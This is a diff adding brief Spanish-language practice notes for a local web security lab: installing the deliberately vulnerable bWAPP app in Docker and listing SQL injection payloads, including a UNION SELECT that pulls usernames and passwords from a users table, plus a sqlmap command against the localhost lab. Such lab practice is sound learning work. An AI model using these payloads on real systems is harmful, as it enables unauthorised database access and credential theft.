@@ -1,0 +1,32 @@
+
+INTRODUCCIÓN 
+
+INSTALACIÓN DEL LABORATORIO UTILIZANDO DOCKER
+
+docker pull raesene/bwapp
+docker run -d -p 8080:80 --name bwapp raesene/bwapp
+http://localhost:8080/
+
+
+metasploitable2
+
+
+
+ataque 1
+SQL Injection (GET/Search)
+' or '1' = '1--
+
+' UNION SELECT null, null, null, null, null,null, null -- 
+
+C:\Python27\python.exe sqlmap.py -u "http://localhost:8080/sqli_1.php?title=aa&action=search"
+
+
+
+
+
+
+
+
+' UNION SELECT username, password, null, null, null FROM users -- 
+
+
